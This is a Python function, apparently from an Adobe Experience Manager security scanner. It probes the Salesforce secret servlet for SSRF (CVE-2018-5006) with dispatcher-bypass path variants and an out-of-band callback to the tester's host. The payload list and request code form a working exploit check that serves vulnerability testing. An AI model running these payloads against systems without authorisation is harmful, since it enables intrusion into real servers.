import concurrent.futures
import itertools
import json
import datetime
import traceback
import sys
import argparse
import base64
import time
from collections import namedtuple
from http.server import BaseHTTPRequestHandler, HTTPServer
from random import choice, randint
from string import ascii_letters
from threading import Thread
import requests


@register('salesforcesecret_servlet')
def ssrf_salesforcesecret_servlet(base_url, my_host, debug=False, proxy=None):
    global token, d
    results = []
    SALESFORCESERVLET1 = itertools.product(('/libs/mcm/salesforce/customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e', '///libs///mcm///salesforce///customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e', '/libs/mcm/salesforce/customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23', '///libs///mcm///salesforce///customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23'), ('.json', '.1.json', '.4.2.1...json', '.html'))
    SALESFORCESERVLET1 = list((pair[0].format(pair[1]) for pair in SALESFORCESERVLET1))
    SALESFORCESERVLET2 = itertools.product(('/libs/mcm/salesforce/customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e', '///libs///mcm///salesforce///customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e', '/libs/mcm/salesforce/customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23', '///libs///mcm///salesforce///customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23'), ('.html/{0}.1.json', '.html/{0}.4.2.1...json', '.html/{0}.css', '.html/{0}.js', '.html/{0}.png', '.html/{0}.bmp', '.html;%0a{0}.css', '.html;%0a{0}.js', '.json;%0a{0}.css', '.html;%0a{0}.png', '.json;%0a{0}.png', '.json;%0a{0}.html', '.json/{0}.css', '.json/{0}.js', '.json/{0}.png', '.json/a.gif', '.json/{0}.ico', '.json/{0}.html'))
    cache_buster = random_string()
    SALESFORCESERVLET2 = list((pair[0].format(pair[1].format(cache_buster)) for pair in SALESFORCESERVLET2))
    SALESFORCESERVLET3 = itertools.product(('/libs/mcm/salesforce/customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e', '///libs///mcm///salesforce///customer{0}?checkType=authorize&authorization_url={{0}}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e', '/libs/mcm/salesforce/customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23', '///libs///mcm///salesforce///customer{0}?customer_key=x&customer_secret=y&refresh_token=z&instance_url={{0}}%23'), ('.{0}.css', '.{0}.js', '.{0}.png', '.{0}.ico', '.{0}.bmp', '.{0}.gif', '.{0}.html'))
    cache_buster = randint(1, (2 ** 12))
    SALESFORCESERVLET3 = list((pair[0].format(pair[1].format(cache_buster)) for pair in SALESFORCESERVLET3))
    for path in itertools.chain(SALESFORCESERVLET1, SALESFORCESERVLET2, SALESFORCESERVLET3):
        url = normalize_url(base_url, path)
        encoded_orig_url = base64.b16encode(url.encode()).decode()
        back_url = 'http://{0}/{1}/salesforcesecret/{2}/'.format(my_host, token, encoded_orig_url)
        url = url.format(back_url)
        try:
            http_request(url, proxy=proxy, debug=debug)
        except:
            if debug:
                error('Exception while performing a check', check='ssrf_salesforcesecret_servlet', url=url)
    time.sleep(10)
    if ('salesforcesecret' in d):
        u = base64.b16decode(d.get('salesforcesecret')[0]).decode()
        f = Finding('SalesforceSecretServlet', u, 'SSRF via SalesforceSecretServlet (CVE-2018-5006) was detected. See - https://helpx.adobe.com/security/products/experience-manager/apsb18-23.html')
        results.append(f)
    return results
